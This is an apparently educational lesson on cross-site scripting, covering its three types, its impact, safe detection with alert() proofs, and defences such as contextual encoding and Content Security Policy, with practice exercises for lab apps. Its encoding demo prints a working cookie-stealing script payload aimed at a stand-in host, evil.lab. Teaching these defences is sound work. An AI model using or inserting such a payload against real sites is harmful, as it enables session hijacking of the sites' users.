---
description: "Cross-site scripting (XSS): reflected, stored and DOM types, real impact, a runnable output-encoding demo, and the encoding + CSP defences that stop it."
---

# Cross-Site Scripting (XSS)

Where SQL injection makes input become part of a *database query*, cross-site scripting makes input
become part of the *HTML page*, so the attacker's JavaScript runs in a victim's browser in the
context of the trusted site. XSS is one of the most common web flaws and its impact is routinely
underestimated — "it's just a popup" misses that the same technique steals sessions and acts as the
user. This lesson covers the three types, the real impact, and the defences, with a runnable demo.
Practise against DVWA/Juice Shop, which have dedicated XSS labs.

## The three types

| Type | Where the payload lives | Trigger |
|------|-------------------------|---------|
| **Reflected** | In the request (e.g. a URL parameter), echoed into the immediate response | Victim clicks a crafted link |
| **Stored** | Saved on the server (a comment, profile, message) and served to others | Victim views the page containing it |
| **DOM-based** | Never leaves the browser; client-side JS writes attacker input into the page | Victim loads a page whose JS mishandles input |

**Reflected** XSS needs the victim to follow an attacker's link. **Stored** is the most dangerous —
the payload sits in the app and fires for *every* viewer (imagine it in a forum post or a support
ticket an admin opens). **DOM-based** happens entirely client-side: the server never sees the
payload; vulnerable JavaScript (e.g. writing `location.hash` into `innerHTML`) is the culprit.

## How it happens

A page greets the user by name, taken from input and placed into HTML:

```python
# UNSAFE — input dropped straight into the page
html_out = "<div>Hello, " + name + "</div>"
```

If `name` is ordinary text, fine. If `name` is a script, the browser doesn't see "text to display"
— it sees markup to execute. Here is genuine output showing the difference. The payload is a
cookie-stealer:

**Vulnerable (input reflected as-is):**

```html
<div>Hello, <script>document.location="http://evil.lab/?c="+document.cookie</script></div>
```

The browser parses that `<script>` as a real script tag and runs it — sending the victim's cookies
to the attacker's server. **With output encoding (the fix):**

```html
<div>Hello, &lt;script&gt;document.location=&quot;http://evil.lab/?c=&quot;+document.cookie&lt;/script&gt;</div>
```

Now the `<` and `>` are the HTML entities `&lt;` and `&gt;`. The browser *displays* the text
`<script>…</script>` on the page and runs nothing. Same input, neutralised by changing how it's
written into the page.

## Why XSS actually matters

Running JavaScript as the victim, on the trusted origin, means the attacker can:

- **Steal session cookies** (unless `HttpOnly` is set) and hijack the account.
- **Act as the user** — make requests the user is authorised for (change email, transfer, post),
  using the user's own session. No cookie theft needed; the script just calls the app's endpoints.
- **Capture keystrokes / credentials** by injecting a fake form.
- **Pivot** — a stored XSS that an administrator views can run in the admin's context.

"It's just an alert box" demonstrations exist because `alert(1)` is a *harmless proof* that script
executes — the professional stops there for evidence rather than deploying a real cookie-stealer.

## Detecting XSS safely

1. Inject a unique harmless marker into each input (e.g. `xss7391`) and find where it reflects in
   the response.
2. Where it reflects, determine the **context** — inside HTML text, an attribute, a `<script>`
   block, a URL. Context decides the payload.
3. Try a context-appropriate *proof* payload that only calls `alert()` or `console.log()` — enough
   to prove execution, nothing harmful.
4. For stored XSS, confirm it persists and fires when the page is re-opened (in your own second
   browser profile, in the lab).

## The defences

- **Output encoding (contextual).** Encode data for the context it's placed in: HTML-entity-encode
  for HTML body, attribute-encode for attributes, JavaScript-encode for script contexts,
  URL-encode for URLs. This is the primary fix, as the demo showed. Modern template engines
  (React/JSX, Jinja2 autoescape, Razor) do HTML-context encoding by default — which is why
  frameworks reduce XSS, though `dangerouslySetInnerHTML`/`| safe`/raw sinks re-open it.
- **Content Security Policy (CSP).** An HTTP response header that tells the browser which script
  sources to trust and can forbid inline scripts. A strong CSP turns many XSS bugs from
  exploitable into blocked — a powerful *second* layer, not a replacement for encoding.
- **`HttpOnly` cookies.** Stops JavaScript reading the session cookie, blunting cookie theft (not
  the act-as-user attacks).
- **Sanitise rich input.** Where users *must* submit HTML (a rich-text editor), run it through a
  vetted sanitiser (e.g. DOMPurify) with an allow-list — never a hand-rolled blacklist.
- **For DOM XSS:** use safe sinks (`textContent`, not `innerHTML`); avoid passing untrusted data to
  `eval`, `innerHTML`, `document.write`.

## How It Actually Works

Why does encoding `<` to `&lt;` stop code execution so completely? Because it moves the attacker's
characters out of the browser's **markup-parsing** state and into its **text** state. An HTML parser
reads a byte stream and switches modes based on structural characters: when it sees `<`, it enters
"tag" mode and starts interpreting what follows as an element (and `<script>` specifically tells it
to hand the contents to the JavaScript engine). The entire attack depends on the attacker's `<`
being interpreted as "start of a tag."

The HTML entity `&lt;` represents the *character* `<` as data to be displayed, not as the structural
`<` that starts a tag. When the parser encounters `&lt;`, it never enters tag mode; it decodes the
entity to a less-than sign and renders it as visible text. So `<script>` encoded as
`&lt;script&gt;` is drawn on the page as the literal string "`<script>`" and the JavaScript engine
is never invoked — exactly what the demo's second line shows. Encoding doesn't "remove" the payload;
it changes which parser state the characters land in, and text state has no power to execute.

This is why encoding must be **contextual**: the "structural" characters differ by context. In an
HTML attribute, a `"` can break out of the attribute; inside a `<script>` block, HTML-encoding does
nothing useful and you need JavaScript-string encoding; in a URL, different characters are
dangerous. Each context has its own parser with its own special characters, so the same data needs
different encoding depending on where it's written. CSP is a complementary mechanism at a different
layer: even if an attacker *does* get a `<script>` into the markup state, the browser checks the
script's source/nonce against the policy and refuses to execute disallowed inline script — a second,
independent gate. Defence in depth works here precisely because encoding and CSP fail in different
ways.

## Common mistakes and pitfalls

- **Encoding for the wrong context.** HTML-encoding data that lands inside a `<script>` block or a
  URL doesn't protect it. Match the encoding to the sink.
- **Blacklisting `<script>`.** Trivially bypassed with event handlers (`onerror=`), other tags,
  casing and encoding tricks. Use output encoding / allow-list sanitisation instead.
- **Relying on `HttpOnly` alone.** It stops cookie *theft* but not act-as-the-user attacks via the
  app's own endpoints.
- **Forgetting DOM XSS.** Server-side encoding doesn't help if client JS writes `location.hash` into
  `innerHTML`. Audit client sinks too.
- **Deploying a real cookie-stealer to "prove" it in a test.** Prove with `alert()`/`console.log()`;
  anything more can violate the RoE and handle data you shouldn't.
- **Assuming frameworks make you immune.** They encode by default *until* you reach for a raw/unsafe
  sink. Those escape hatches are where framework-based apps get XSS.

## Exercise

1. Recreate the encoding demo locally: write a function that builds `"<div>Hello, " + name +
   "</div>"` and one that HTML-encodes `name`. Feed both a `<script>alert(1)</script>` string and
   compare the output.
2. In DVWA/Juice Shop, find a reflected XSS. Use a unique marker to locate the reflection, identify
   its context, and prove execution with `alert(document.domain)` (harmless).
3. Find a stored XSS in the practice app. Confirm it persists and fires on reload. Explain why
   stored XSS is more dangerous than reflected.
4. Write a Content-Security-Policy header that would block inline script execution, and explain how
   it would affect your proof payload from exercise 2.
5. Explain, in your own words, why converting `<` to `&lt;` prevents execution, referencing the
   browser's parser states.
